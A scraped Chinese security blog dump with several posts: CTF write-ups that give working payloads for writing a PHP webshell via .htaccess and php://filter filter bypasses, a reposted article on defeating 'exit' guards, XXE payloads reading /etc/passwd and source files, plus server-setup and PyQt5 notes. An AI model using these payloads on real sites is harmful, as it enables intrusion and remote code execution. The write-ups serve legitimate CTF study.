!== &quot;index.php&quot;){ unlink($file); } } } file_put_contents($filename,$content . &quot;\\nJust one chance&quot;); ?&gt; 函数解释： ①unlink() 删除文件。如果成功，该函数返回 TRUE。如果失败，则返回 FALSE。 unlink(filename,context) 参数 描述 filename 必需。规定要删除的文件。 context 可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。 ②stristr() 搜索字符串在另一字符串中的第一次出现。 注释：该函数是二进制安全的。 注释：该函数是不区分大小写的。如需进行区分大小写的搜索，请使用 strstr() 函数。 stristr(string,search,before_search) 参数 描述 string 必需。规定被搜索的字符串。 search 必需。规定所搜索的字符串。如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符。 before_search 可选。一个默认值为 “false” 的布尔值。如果设置为 “true”，它将返回 search 参数第一次出现之前的字符串部分。 技术细节 返回值： 返回字符串的剩余部分（从匹配点）。如果未找到所搜索的字符串，则返回 FALSE。 PHP 版本： 4+ 更新日志： 在 PHP 5.3 中，新增了 before_search 参数。 在 PHP 4.3 中，该函数变成是二进制安全的。 题目的大致意思就是要我们通过file_put_contents函数来写马，但是对我们可以控制的参数$filename和$content分别进行了preg_match函数和stristr函数的过滤，preg_match的过滤要求是输入的文件名必须只能带有 [a-z\\.] 范围的字符，stristr函数则是过滤了on，type，flflag，file等关键字 一开始应该都能想到直接写一个php文件带有一句话，但是写完访问会发现解析不了php代码，这是因为本题的环境只对index.php文件进行解析，而且在题目源码的开头和末尾都对当前目录下的文件进行了检查，删除除了index.php外的所有文件 那么既然只解析index.php，不妨写入一个.user.ini让index.php自动包含上我们写入的马，或者是.htaccess让当前目录下的所有文件都能解析为php文件，但是如果是第二种思路，一定需要写多次，前面写的.htaccess会被删掉；而如果是写上开头自动包含，并且包含的文件就是.user.ini，并且在.user.ini中直接写入马，那么理论上 index.php在删除前就可以执行到我们写入的马。这里说明一下，.user.ini本题环境好像不支持，所以只能用.htaccess，.htaccess同样可以设置开头自动包含，首先查阅一下.htaccess设置php环境变量的格式，如下： #format php_value setting_name setting_value #example php_value auto_prepend_file .htaccess 那么我们到现在就可以大致的确定我们要写入的文件.htaccess，文件内容为： php_value auto_prepend_file .htaccess #&lt;?php phpinfo();?&gt;\\ 特别要注意一下，这里文件末尾有个符号\\是必须写入的，我们注意到源代码中file_put_contents中的文件内容传入的变量$content末尾还连接上了\\nJust one chance这个字符串，而\\n代表着换行，而我们再一个\\，则会拼接成\\\\n ，即转义掉了n前面的\\，构不成换行。换句话来说，如果我们没有加入\\，那么写入.htaccess的文件内容就为： php_value auto_prepend_file .htaccess #&lt;?php phpinfo();?&gt; Just one chance 会出现末尾行的字符串不符合htaccess文件的语法标准而报错导致htaccess文件无法执行，那么当前目录下的所有文件就会面临崩溃，所以说，末尾必须写入\\但是，我们会发现这里写入的内容带有file关键字，那么我们接下来就是要绕过stristr的过滤，这里总结一下，有三种解题的方法： 方法一参考p神的一篇文章：谈一谈php://filter的妙用 文章里面提到了file_put_contents函数中的第一个参数$filename，即写入的文件名是可以控制协议的，所以我们可以用php://filter流的base64-decode方法将文件内容参数$content进行base64解码，那么这样就可以通过将内容进行base64加密来绕过stristr函数的检查 测试代码如下： &lt;?php error_reporting(0); if(!$_GET[&#39;filename&#39;] &amp;&amp; !$_GET[&#39;content&#39;]){ highlight_file(__file__); } else{ $filename = $_GET[&#39;filename&#39;]; $content = $_GET[&#39;content&#39;]; if(stristr($content,&#39;&lt;?php&#39;)){ echo &#39;Hacker&#39;; die(); } file_put_contents($filename, $content); } ?&gt; &gt;&gt;&gt; base64.b64encode(&#39;&lt;?php phpinfo();?&gt;&#39;) &#39;PD9waHAgcGhwaW5mbygpOz8+&#39; 那么到这里，我们又要面临一个问题，文件名要写入php://filter的话，又需要绕过preg_match的检查了，我们 熟悉的preg_match是处理数组是会返回NULL，但是这里file_put_contents函数传入的文件名参数又不支持数组 的形式，所以只能另想它法 思路就是通过正则匹配的递归次数来绕过，由pcre.backtrack_limit参数来控制： 我们这把则是要让preg_match返回false，也就是匹配不到，这里就有一个骚操作，就是通过设置pcre.backtrack_limit值为0，使得回溯次数为0，来使得正则匹配什么都不匹配，即返回false 要注意的是这边测试得知php版本&gt;=7，所以还需要特别设置pcre.jit这个环境变量为0，不适用JIT引擎来匹配正则表达式，就使得pcre.backtrack_limit这个环境变量能正常生效 测试如下： &lt;?php ini_set(&#39;pcre.backtrace_limit&#39;,0); ini_set(&#39;pcre.jit&#39;,0); var_dump(preg_match(&#39;/[^a-z\\.]/&#39;,&#39;php://filter&#39;)); ?&gt; 而pcre.backtrack_limit既然是php的环境变量，自然也可以在.htaccess中进行设置 综上首先，传入payload如下： Ps:试用这个Payload之前，先将unlink注释掉，不然会删除我们测试环境里的其他文件 ?filename=.htaccess&amp;content=php_value pcre.backtrack_limit 0%0aphp_value pcre.jit 0%0a%23\\ 写入.htaccess的内容如下： php_value pcre.backtrack_limit 0 php_value pcre.jit 0 #\\ Just one chance 这个上传的.htaccess文件的作用就是使得我们能绕过preg_match函数，接下来传入payload如下： ?filename=php://filter/write=convert.base64- decode/resource=.htaccess&amp;content=cGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0IDAKcGhwX3ZhbHVlIHBjcm Uuaml0IDAKcGhwX3ZhbHVlIGF1dG9fYXBwZW5kX2ZpbGUgLmh0YWNjZXNzCiNhPD9waHAgZXZhbCgkX0dFVFsxXSk7Pz5c 对于第一次写入的.htaccess文件，生效后使得我们绕过了preg_match函数的检测，再次写入了.htaccess文件，内容带有自动包含头和php马，生效后，最后再传入 ?filename=php://filter/write=convert.base64- decode/resource=.htaccess&amp;content=cGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0IDAKcGhwX3ZhbHVlIHBjcm Uuaml0IDAKcGhwX3ZhbHVlIGF1dG9fYXBwZW5kX2ZpbGUgLmh0YWNjZXNzCiNhPD9waHAgZXZhbCgkX0dFVFsxXSk7Pz5c&amp;1 =phpinfo(); 即可成功执行shell 当然，也有个更简单的方法 方法二我们可以通过对过滤的关键字中间添加换行\\n来绕过stristr函数的检测，不过仍然需要注意添加\\来转义掉换行，这样才不会出现语法错误，如此一来就不需要再绕过preg_match函数，即可直接写入.htaccess来getshell，payload如下： ?content=php_value%20auto_prepend_fil\\%0ae%20.htaccess%0a%23&lt;? php%20system(&#39;cat%20/root/fla&#39;.&#39;g.txt&#39;);?&gt;\\&amp;filename=.htaccess 写入.htaccess的内容： php_value auto_prepend_fil\\ e .htaccess #&lt;?php system(&#39;cat /root/fla&#39;.&#39;g.txt&#39;);?&gt;\\ Just one chance 方法三这个方法是官方的预期解 我们可以注意到源代码中有一行包含的语句： include_once(&quot;fl3g.php&quot;); 做题时我们就会发现，这个文件实际上在网站目录下是不存在的，那么题目特地加上这一句，实际上就是让我们去创建一个fl3g.php，写入一句话，再通过index.php包含fl3g.php来getshell。但是我们知道，题目的环境已经设置了只解析index.php这个文件，如果我们在网站目录下写，那肯定是解析不了的。所以我们可以在其他目录，例如/tmp目录下写入fl3g.php，那么怎么让index.php包含的路径为/tmp这就需要利用到php的一个配置选项：include_path,如果/tmp目录下有fl3g.php，就可以包含该文件 接下来就是设法写入/tmp/fl3g.php文件了，我们同样可以通过之前的方法设置prce_backtrack_limit来绕过写该文件，不过官方的解是利用到php的配置选项：error_log，该选项可以将php运行的报错信息写入到指定文件下。那么如何触发报错，我们可以利用将include_path设置为一句话木马，然后index.php执行到包含语句时，会因为将一句话作为路径去访问不存在而出现报错，并将报错的信息写入到tmp/fl3g.php","categories":[],"tags":[{"name":"CTF比赛","slug":"CTF比赛","permalink":"https://knlvre.github.io/tags/CTF比赛/"}],"author":"Knlvre"},{"title":"Linux系统下搭建Web服务器和FTP服务器","slug":"Linux系统下搭建Web服务器和FTP服务器","date":"2019-09-02T16:00:00.000Z","updated":"2019-09-04T08:09:06.723Z","comments":true,"path":"2019/09/03/Linux系统下搭建Web服务器和FTP服务器/","link":"","permalink":"https://knlvre.github.io/2019/09/03/Linux系统下搭建Web服务器和FTP服务器/","excerpt":"","text":"Web服务器安装与配置Apache2和php组件的安装使用如下命令来安装Apache2和php的组件 Ps：如果只安装Apache2，将会导致写的php文件无法被解析 apt-get install apache2 apt-get install php 命令状态：/etc/init.d/apache2 status（service apache2 status） 开启：/etc/init.d/apache2 start（service apache2 start） 关闭：/etc/init.d/apache2 stop（service apache2 stop） 重启：/etc/init.d/apache2 restart（service apache2 restart） 网站根目录网站根目录位于： /var/www/html 创建文件时，一些文件记得修改文件对应的权限，才能访问 登录验证Apache2带有登录验证的功能，（1） 在/etc目录下创建.Webpasswd文件，设置登陆使用的用户名和密码。该文件为验证使用的储存用户名密码的文件 修改/etc/apache2/sites-available/000-default.conf文件，修改内容如下图所示。 修改完成后再去访问就会看到弹出身份认证框 FTP服务器安装与配置vsftpd组件的安装使用如下命令来安装Apache2的组件 apt-get install vsftpd 命令查看状态：/etc/init.d/vsftpd status 开启：/etc/init.d/vsftpd start 关闭：/etc/init.d/vsftpd stop 重启：/etc/init.d/vsftpd restart 配置创建专门用于上传下载的目录（记得设置权限，不然会导致无法创建文件） 创建新用户并设置密码 修改配置文件 etc/vsftp.conf ,在文件头添加如下内容 取消掉 write_enable=YES 的注释，使其生效，不然无法写入文件 新建 /etc/allowed_users 文件，添加允许访问的用户，我们在文件中添加我们刚才创建的用户 uftp 可以查看 /etc/ftpusers 文件，文件中的列表是禁止访问的用户 重启 vsftpd 服务，并查看状态 安装 ftp 命令apt-get install ftp 至此，vsftp 服务器就安装完成了，下面简单演示一下如何用命令传输文件 使用通过 ftp + IP地址 命令访问FTP服务；输入正确的用户名和密码进入服务；通过 put 命令来上传指定的文件。如图所示，本次实验将提前准备好的位于用户根目录下的 FTP_Success.gif 文件上传，（local-file）选项填写我们要上传的文件及其所处位置，（remote-file）选项填写文件上传后的位置 通过 netstat -atunp | grep ftp 命令来查看ftp服务使用的端口号 在我们的客户端（也就是我的Windows 10物理机），利用 LeapFTP 软件来连接服务器（也就是我的Kali Linux虚拟机）提供的FTP服务。在主界面点击左上角的 FTP-&gt;Quick Connect 来建立新连接 在弹出来的对话框中输入，服务器的IP地址、端口号（默认21）、Username、Password。这里的用户名密码填写我们刚才创建的那个用户（既 uftp 这个用户） 确定后，等待一段时间，就可以在主界面的右侧看到成功连接，并且文件夹里有我们刚才上传的文件：FTP_Success.gif。 可以右击我们想要下载的目标文件，点击 Download 来下载。下载目录可以在主界面的左侧选择，如下图，我们成功将 FTP_Success.gif 文件下载到了我物理机的桌面上。 前面有提到 /etc/allowed_users 文件是允许访问FTP服务器的用户列表，而 /etc/ftpusers 是禁止访问FTP服务器的用户列表，现在我们看一下两个列表的名单 可以看到现在允许访问的只有 uftp 怎么一个用户，而 root 用户是禁止访问的。现在我们在 LeapFTP 上，用 root 用户登录验证一下。可以看到，是登录失败的 现在我们将 root 用户添加到允许访问名单中，然后再登录试一下 可以看到在我们将 roor 用户添加到允许访问名单，并将之在禁止访问名单中去除后，就可以访问 FTP 服务器了，所以证明允许访问和禁止访问的名单还是有生效的。现在我们用 Wireshark 抓包来看一下 FTP 协议从建立连接到下载文件的完整过程 如下图可见TCP的三次握手建立的过程。FTP分为利用TCP和UDP两类，可以看出来我们本次实验使用的是可靠地TCP 可以看到从第981个包开始，客户端向FTP服务器发起请求，这就是我后来的下载操作 我们可以选中Protocol类型为FTP-DATA的数据包，右击-&gt;追踪流-&gt;TCP流，来查看完整的TCP流数据 从本TCP流中可看出，都是服务器向客户端发送数据，并且传输的内容为一张gif图片 可以将这个数据流以原始数据的方式保存下来，并命名为 wireshark.gif 借助工具 winhex 将抓取下来的图片的十六进制与我们原本用来测试的 FTP_Success.gif 对比一下，不仅可以用gif图片的格式打开查看，而且内容没有半点差异","categories":[],"tags":[{"name":"基础知识点","slug":"基础知识点","permalink":"https://knlvre.github.io/tags/基础知识点/"}],"author":"Knlvre"},{"title":"Python — PyQt5库的初次应用","slug":"Python — PyQt5库的初次应用","date":"2019-08-31T16:00:00.000Z","updated":"2019-09-01T12:54:35.909Z","comments":true,"path":"2019/09/01/Python — PyQt5库的初次应用/","link":"","permalink":"https://knlvre.github.io/2019/09/01/Python — PyQt5库的初次应用/","excerpt":"","text":"前言本文章对大三下学期的一门课程设计做一个简单的记录 写了4个进程调度算法，并利用Python3的PyQt5库设计了GUI，代码量大概为1000行 第一次接触GUI，现学现卖，没有做任何优化 一、Python 3.7环境下安装PyQt52.安装PyQt5 pip install PyQt5 2.安装 sip pip install sip 3.安装PyQt5-tools pip install PyQt5-tools 安装成功之后就可以在路径下看到pyqt5_tools文件夹（我的是：Python37\\Lib\\site-packages\\pyqt5_tools） 双击文件夹内的designer.exe就可以打开QT Designer应用 如果可以打开，此时就算安装成功了 二、利用PyQt5编写GUI（1）利用QT Designer应用设计 在QT Designer应用中，可以选择创建窗口的类型（如：Main Window、Dialog、Widget等） 选择完窗口类型过后，可以通过左边的工具栏添加各种按钮、文本框、表格等，并且通过右边的工具栏调整位置、大小等 点击保存后，会生成一个.ui的文件，以xml格式记录内容，这个文件是无法直接调用的 通过如下命令，将保存下来的ui文件转换为py文件 pyuic5 -o [name].py [name].ui 通过在这个py文件添加如下图的代码，就可以直接运行。 MainWindow类型： QDialog类型： 添加之后直接编译运行该Python文件就可以看到我们设计的窗口了 （2）手动编写代码 原本的ui格式的文件是以xml标签的形式存储，我们是无法直接在Python代码中使用的。上一种方式讲到可以将ui文件转化为py文件，其内部的代码也可以转换为Python语句，添加代码就可以运行，可以直接添加、改写生成的py文件内的代码，就可以改变窗口的内容。 如：给窗口添加线条 如：给窗口添加按钮 三、四种调度算法核心代码下面直接展示简单完成的调度算法的代码（代码只追求完成任务，没有任何优化嘻嘻） 1.先来先服务调度算法 2.最短作业优先调度算法 3.最高响应比优先调度算法 4.时间片轮转算法 每个算法都放入一个QDialog窗体内，每个窗体都是一个6×7的表格来展示内容。6行分别是四个进程的执行结果、标题和总结（总结包括平均周转总和、带权周转时间总和、平均周转时间、带权平均周转时间）；7列分别是进程号、到达时间、服务时间、开始运行时间、完成运行时间、周转时间、带权周转时间 由于设计代码较多、较杂，这里只展示比较实用的部分： 表格设置为不可修改，该窗体只是起到结果展示的作用，这样设置就不会因为误操作引起的一系列麻烦 设置部分单元格合并，合并的单元格用于显示平均周转时间、带权平均周转时间的结果 将设置好的行、列数进行自动拉伸，填充表格区域，使每一行每一列的单元格大小一致，表格看上去更加清晰 隐藏行头标签，不隐藏列头标签，使运算结果看起来更加清楚 通过向MainWindow窗口内添加了5个PushButton，来分别对应于4个调度算法和1个查看执行进程参数。那么就需要实现点击不同的PushButton，跳转到分别与之对应的算法，这个功能通过另外一个Python文件来实现。代码如下： 四、程序最后运行结果MainWindow窗口 窗口的各个部分的简单解释 多个窗口的跳转","categories":[],"tags":[{"name":"基础知识点","slug":"基础知识点","permalink":"https://knlvre.github.io/tags/基础知识点/"}],"author":"Knlvre"},{"title":"转载 | php://filter的妙用","slug":"转载 谈一谈php之filter的妙用","date":"2019-08-31T16:00:00.000Z","updated":"2019-09-03T01:28:48.729Z","comments":true,"path":"2019/09/01/转载 谈一谈php之filter的妙用/","link":"","permalink":"https://knlvre.github.io/2019/09/01/转载 谈一谈php之filter的妙用/","excerpt":"","text":"前言转载文章：https://www.leavesongs.com/PENETRATION/php-filter-magic.html php://filter是PHP中独有的协议，利用这个协议可以创造很多“妙用”，本文说几个有意思的点，剩下的大家自己下去体会。本来本文的思路我上半年就准备拿来做XDCTF2016的题目的，没想到被三个白帽的一题抢先用了，我也就只好提前分享一下。 XXE中的使用php://filter之前最常出镜的地方是XXE。由于XXE漏洞的特殊性，我们在读取HTML、PHP等文件时可能会抛出此类错误parser error : StartTag: invalid element name 。其原因是，PHP是基于标签的脚本语言，&lt;?php ... ?&gt;这个语法也与XML相符合，所以在解析XML的时候会被误认为是XML，而其中内容（比如特殊字符）又有可能和标准XML冲突，所以导致了出错 那么，为了读取包含有敏感信息的PHP等源文件，我们就要先将“可能引发冲突的PHP代码”编码一遍，这里就会用到php://filter php://filter是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流。比如，我们可以用如下一行代码将POST内容转换成base64编码并输出： 访问并POST 所以，在XXE中，我们也可以将PHP等容易引发冲突的文件流用php://filter协议流处理一遍，这样就能有效规避特殊字符造成混乱 巧用编码与解码使用编码不光可以帮助我们获取文件，也可以帮我们去除一些“不必要的麻烦”。 记得前段时间三个白帽有个比赛，其中有一部分代码大概类似于以下： &lt;?php $content = &#39;&lt;?php exit; ?&gt;&#39;; $content .= $_POST[&#39;txt&#39;]; file_put_contents($_POST[&#39;filename&#39;], $content); ?&gt; $content在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了（这个过程在实战中十分常见，通常出现在缓存、配置文件等等地方，不允许用户直接访问的文件，都会被加上if(!defined(xxx))exit;之类的限制）。那么这种情况下，如何绕过这个“死亡exit”？ 幸运的是，这里的$_POST[&#39;filename&#39;]是可以控制协议的，我们即可使用 php://filter协议来施展魔法：使用php://filter流的base64-decode方法，将$content解码，利用php base64_decode函数特性去除“死亡exit”。 众所周知，base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。 所以，一个正常的base64_decode实际上可以理解为如下两个步骤： &lt;?php $_GET[&#39;txt&#39;] = preg_replace(&#39;|[^a-z0-9A-Z+/]|s&#39;, &#39;&#39;, $_GET[&#39;txt&#39;]); base64_decode($_GET[&#39;txt&#39;]); ?&gt; 所以，当$content被加上了&lt;?php exit; ?&gt;以后，我们可以使用 php://filter/write=convert.base64-decode 来首先对其解码。在解码的过程中，字符&lt;、?、;、&gt;、空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpexit”和我们传入的其他字符。 “phpexit”一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“a”一共8个字符。这样，”phpexita”被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是&lt;?php exit; ?&gt;没有了。 最后效果是 ： 利用字符串操作方法有的同学说，base64的算法我不懂，上面的方法太复杂了。 其实，除了使用base64特性的方法外，我们还可以利用php://filter字符串处理方法来去除“死亡exit”。我们观察一下，这个&lt;?php exit; ?&gt;实际上是什么？ 实际上是一个XML标签，既然是XML标签，我们就可以利用strip_tags函数去除它，而php://filter刚好是支持这个方法的。 编写如下测试代码即可查看 echo readfile(&#39;php://filter/read=string.strip_tags/resource=php://input&#39;); 可见，&lt;?php exit; ?&gt;被去除了。但回到上面的题目，我们最终的目的是写入一个webshell，而写入的webshell也是php代码，如果使用strip_tags同样会被去除。 万幸的是，php://filter允许使用多个过滤器，我们可以先将webshell用base64编码。在调用完成strip_tags后再进行base64-decode。“死亡exit”在第一步被去除，而webshell在第二步被还原。 最终的数据包如下： 除此之外，我们还可以利用rot13编码独立完成任务。原理和上面类似，核心是将“死亡exit”去除。&lt;?php exit; ?&gt;在经过rot13编码后会变成&lt;?cuc rkvg; ?&gt;，在PHP不开启short_open_tag时，php不认识这个字符串，当然也就不会执行了： 当然，这个方法的条件就是不开启短标签","categories":[],"tags":[{"name":"CTF-Web","slug":"CTF-Web","permalink":"https://knlvre.github.io/tags/CTF-Web/"}],"author":"Knlvre"},{"title":"2019网络与信息安全领域专项赛 — 线上赛WriteUp","slug":"CTF比赛—2019网络与信息安全领域专项赛WriteUp","date":"2019-08-14T16:00:00.000Z","updated":"2019-09-03T02:07:44.223Z","comments":true,"path":"2019/08/15/CTF比赛—2019网络与信息安全领域专项赛WriteUp/","link":"","permalink":"https://knlvre.github.io/2019/08/15/CTF比赛—2019网络与信息安全领域专项赛WriteUp/","excerpt":"","text":"前言没报名比赛，用同学的账号做一下题目 Web1. Game题目进去是一个游戏机，只有Shuffle和Stop两个按钮可以点击，没什么作用 查看源码，其他没什么用，但是发现一个js文件（cqg.js），点击查看源代码 在末尾发现了关键代码 if(score == 15){ $.ajax({ url: &#39;score.php&#39;, type: &#39;POST&#39;, data: &#39;score=&#39;+score, success: function(data){ var data = data; $(&quot;#output&quot;).text(data); } }) 直接访问score.php，抓包修改为POST方式，提交score=15，直接拿到了flag 2. who_are_you?本题考察XXE漏洞的利用，参考文章：https://blog.csdn.net/weixin_39997829/article/details/79654861 Q1：什么是XXE漏洞？ A1：XML外部实体（XML External Entity），XXE漏洞一般称为xml外部实体攻击漏洞 . Q2：xml语言是什么？ A2：XML百度的解释：可扩展标记语言，标准通用标记语言的子集，是一种用于标记电子文件使其具有结构性的标记语言 下面的例子中，username、password、address被称为xml的元素 &lt;?xml version=&quot;1..0&quot;?&gt; &lt;student&gt; &lt;username&gt;xxx&lt;/username&gt; &lt;password&gt;yyy&lt;/password&gt; &lt;address&gt;zzz&lt;/address&gt; &lt;/student&gt; 有些XML文档包含system标识符定义的实体，这些XML文档会在DOCTYPE头部标签中呈现。这些定义的实体能够访问本地或者远程的内容。比如，下面的XML文档样例就包含了XML实体 这一段代码，其中Entity就是外部实体，我们可以通过这个参数来访问file://etc/passwd的内容，因为我们web服务器在解析xml文档的过程中，实体Entity的值会直接被替换成file://etc/passwd。关键字SYSTEM会告诉XML解析器，Entity的实体值将会从后面的URL获取，也就是我们所替换的file:///etc/passwd文件，其实这个过程就是XML实体攻击过程 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE what_ever[ &lt;!ENTITY Entity SYSTEM &quot;file://etc/passwd&quot;&gt; ]&gt; &lt;feedback&gt;&lt;author&gt;&amp;Entity;&lt;/author&gt;&lt;/feedback&gt; . Q3：怎么识别存在xml外部实体攻击漏洞（XXE）？ A3：最快速的方法就是通过burpsuit抓取关键的包，如果包中存在xml实体，并且服务器端如果解析了这个实体，那么就很可能存在XXE漏洞，接下来就按本道题来做个例子 首先我们在输入框内填入：&quot;XXE_Entity_Test&quot;，点击Submit，抓下这个包 可以看到该包POST的内容为： &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;feedback&gt;&lt;author&gt;XXE_Entity_Test&lt;/author&gt;&lt;/feedback&gt; 发现了xml外部实体（即XXE_Entity_Test），点击Go，在Response中我们可以确认web应用正在解析xml的内容，接受用户特定或者自定义的输入，然后呈现给用户 为了验证，我们将实体改为XXE_Entity_Test_2，可以看到返回结果随着我们的改变而改变 可以看到应用程序确实是直接解析了xml，那么如果xml文档中有一个参数是用来调用远程服务器的内容，并且这个参数是可控的？在构造这个参数之前，我们需要知道这个实体的名称，方法就是查看源代码。如本题，实体名称为name 知道实体名称后，就可以构造参数了（php://filter/read=convert.base64-encode/resource=index.php），直接通过php伪协议去读取index.php的源代码 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE what_ever[ &lt;!ENTITY name SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot;&gt; ]&gt; &lt;feedback&gt;&lt;author&gt;&amp;name;&lt;/author&gt;&lt;/feedback&gt; Base64解码之后，直接在源码中看到了flag flag{26a4b2cb-28c3-42f5-81a9-faafda680763} Misc一共4道题目 考查知识点有：DNS查询、GIF帧分析、图片通道、社会主义核心价值观编码、Ook!编码 1. 签到题只给出I&#39;m gamectf.com, I love TXT.的提示 是DNS查询题目，到这个网站跑一下就出来了：https://dnslookup.online/txt.html flag{welcome_TXT} 2. 七代目下载下来一个ZIP压缩文件，解压出来七代目.gif，但是图片打不开，用Winhex查看发现文件头错误（将原本的89504e47改为47494638） 用图片浏览器打开时发现图片并没有动。打开Kali，使用命令： identify -format &quot;%s %T \\n&quot; 七代目.gif 发现图片中第7帧的间隙与其他的不同，再结合题目名称——七代目，这个第7帧应该有问题 Stegsolve保存第7帧并打开，将通道切换至Colour Inversion(Xor)，直接看到flag flag{49bdbe-able-47-9f66-a533331e6} 3. 亚萨西下载下来一个ZIP压缩文件，解压时需要密码。刚开始以为是伪加密，后来发现不是。在文件末尾发现了解压密码loli 解压下来timg.jpg，在文件末尾发现Ook!编码 Ps：解压时发现Winrar会文件头报错，但是7-zip可以直接忽略 直接到在线网站去解密：http://tool.bugku.com/brainfuck/?wafcloud=2&amp;tdsourcetag=s_pcqq_aiomsg flag{f71d6bca-3210-4a31-9feb-1768a65a33db} 4. 24word下载下来一个ZIP压缩文件，解压出来24w.png。foremost跑出来一个zip压缩文件和一个png图片 ZIP文件解压需要密码；PNG图片里面是社会主义核心价值观 这个是社会主义核心价值观编码，到在线网站：https://z.duoluosb.com/ 密文：自由和谐公正诚信平等公正自由公正平等平等公正公正民主公正诚信文明法治平等公正平等法治和谐 解出：CodeValues 用解出的拿去作为ZIP密码，解压得到24c.jpg，打开图片发现藏着一个二维码，微信扫一下直接得到flag flag{24_word_m4n7ra}","categories":[],"tags":[{"name":"CTF比赛","slug":"CTF比赛","permalink":"https://knlvre.github.io/tags/CTF比赛/"}],"author":"Knlvre"},{"title":"2019 ISCC — 线下赛WriteUp","slug":"CTF比赛—2019ISCC线下赛WriteUp","date":"2019-07-25T16:00:00.000Z","updated":"2019-11-08T13:42:00.906Z","comments":true,"path":"2019/07/26/CTF比赛—2019ISCC线下赛WriteUp/","link":"","permalink":"https://knlvre.github.io/2019/07/26/CTF比赛—2019ISCC线下赛WriteUp/","excerpt":"","text":"前言本次比赛的赛程安排是上午解题，下午AWD。算是真正意义上第一次参加AWD比赛，记录一下学习的内容 PWNimport string dic = string.printable flag = &#39;&#39; pair = [ 0x17F5B345,0x17F5B30C, 0xF16B77E2,0xF16B77B1, 0xB2B21947,2998016260, 0x58A9F98B,1487534536, 0x20A99D0A,547986801, 0x96D85B20,2530761537, 0xBBEA9A3E,3152714326, 0x35512DBE,894512607, 0x2838DCF7,674815144, 0x4EA1DF87,1319231476, 0xE22DCCED,3794652292, 0xDD2C662E,3710674499, 0x106B37C4,275462068, 0x46B4426E,1186218498, 0xAA67C7F4,2858928017, 0x72C06EBD,1925213922, 0xB0117F7F,2953936653, 0xF91B93EC,4179334025, 0xD43CE914,3560761698, 0xF6EA0CED,4142533768, 0x402A0997,1076496869, 0xADACB707,2913777524, 0xE79C5520,3885782341, 0x4B76BD4C,1266072881 ] for i in range(0,len(pair),2): for j in dic: if ord(j) ^ pair[i] == pair[i+1]: flag += j print flag MISC本次的MISC题目是流量分析+RSA解密 HTTP 流量有几个尝试注入的包，应该是迷惑用的 题目给的 secret 文件，看格式像是 RSA 秘钥，看长度像是 RSA 私钥，于是添加私钥头补全 -----BEGIN RSA PRIVATE KEY----- xxxx -----END RSA PRIVATE KEY----- 这里注意 secret 里是有两个私钥的，分别提出保存 用 tcp &amp;&amp; ip.dst == 10.0.0.0/8 &amp;&amp; !http 规则过滤掉干扰包，发现一个 tcp 流里有疑似公钥的信息，以及一个 secure message tool v1.0 的明文，联想到题目给的 secret 私钥，于是分别提取出公钥，公钥头格式如下 -----BEGIN RSA PUBLIC KEY----- xxx -----END RSA PUBLIC KEY----- 然后构造脚本解密 import rsa # tcp.stream eq 128 and secret file files = [&#39;a.pub&#39;, &#39;a.pri&#39;, &#39;b.pub&#39;, &#39;b.pri&#39;] lst = { &#39;a.pub&#39;:0, &#39;a.pri&#39;:0, &#39;b.pub&#39;:0, &#39;b.pri&#39;:0 } # load rsa key for f in files: with open(f, &#39;r&#39;) as fp: if f.endswith(&#39;pub&#39;): lst[f] = rsa.PublicKey.load_pkcs1(fp.read().encode()) else: lst[f] = rsa.PrivateKey.load_pkcs1(fp.read().encode()) # decrypt messages from wireshark tcp.stream eq 128 with open(&#39;./messages.txt&#39;, &#39;r&#39;) as fp: for msg in fp.readlines(): msg = msg.strip().split(&#39;:&#39;) sender = msg[0] content = msg[1].decode(&#39;hex&#39;) if sender == &#39;A&#39;: plain_text = rsa.decrypt(content, lst[&#39;a.pri&#39;]) elif sender == &#39;B&#39;: plain_text = rsa.decrypt(content, lst[&#39;b.pri&#39;]) print &#39;{} =&gt; {}&#39;.format(sender, plain_text) 用私钥是能够成功解密的，但解密了一半抛异常，观察了一下解密出的信息，发现是一个类似握手的过程，其中确定了后续传输的加密方式为 AES256 ECB 模式以及传输秘钥 key key的长度是 32，符合 AES256 的要求，于是改了一下脚本，后续用 AES256 ECB 继续解密，得到所有传输的明文，脚本如下 import rsa # tcp.stream eq 128 and secret file files = [&#39;a.pub&#39;, &#39;a.pri&#39;, &#39;b.pub&#39;, &#39;b.pri&#39;] lst = { &#39;a.pub&#39;:0, &#39;a.pri&#39;:0, &#39;b.pub&#39;:0, &#39;b.pri&#39;:0 } # load rsa key for f in files: with open(f, &#39;r&#39;) as fp: if f.endswith(&#39;pub&#39;): lst[f] = rsa.PublicKey.load_pkcs1(fp.read().encode()) else: lst[f] = rsa.PrivateKey.load_pkcs1(fp.read().encode()) # decrypt messages with open(&#39;./messages.txt&#39;, &#39;r&#39;) as fp: for msg in fp.readlines(): msg = msg.strip().split(&#39;:&#39;) sender = msg[0] content = msg[1].decode(&#39;hex&#39;) try: if sender == &#39;A&#39;: plain_text = rsa.decrypt(content, lst[&#39;a.pri&#39;]) elif sender == &#39;B&#39;: plain_text = rsa.decrypt(content, lst[&#39;b.pri&#39;]) print &#39;{} =&gt; {}&#39;.format(sender, plain_text) except: pass # get AES256 ECB KEY = CZS3MgDiippCb67ojMpFRnPu9FfLvIn6 from Crypto.Cipher import AES key = &#39;CZS3MgDiippCb67ojMpFRnPu9FfLvIn6&#39; aes = AES.new(key, AES.MODE_ECB) with open(&#39;./ecb_messages.txt&#39;, &#39;r&#39;) as fp: for msg in fp.readlines(): msg = msg.strip().split(&#39;:&#39;) sender = msg[0] content = msg[1].decode(&#39;hex&#39;) plain_text = aes.decrypt(content) print &#39;{} =&gt; {}&#39;.format(sender, plain_text) 